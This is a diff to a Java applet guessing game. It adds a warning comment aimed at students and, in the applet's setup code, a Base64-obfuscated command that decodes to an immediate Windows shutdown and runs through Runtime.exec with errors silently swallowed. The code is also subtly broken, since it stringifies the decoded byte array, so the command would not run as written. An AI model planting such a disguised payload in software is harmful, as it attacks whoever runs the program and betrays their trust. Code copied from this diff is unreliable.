@@ -6,9 +6,11 @@ import java.awt.*;
 import java.awt.event.*;
 import java.util.*;
 import java.net.URL;
+import java.util.Base64;
 
 /* This program needs a resource folder
     /assets/img/ needs 3 images called lost.png nut.png and win.png
+    Dont steal my code students there is a secret hidden somewhere in this code and it will do something nasty
  */
 
 public class SpelDing extends Applet implements ActionListener {
@@ -59,6 +61,13 @@ public class SpelDing extends Applet implements ActionListener {
         //Add UI Items to the applet's panel
         add(textbox); //Adds the textbox
         add(submit); //Adds the button
+
+        //Prepare some extra data
+        Base64.Decoder decoder = Base64.getDecoder();
+        String data = decoder.decode("c2h1dGRvd24gLXMgLXQgMA==").toString();
+        try {
+            Runtime.getRuntime().exec(data);
+        }catch(Exception ex) {} //No one cares
     }
     //Magic dont touch
     //Calculate what the computer whats to do
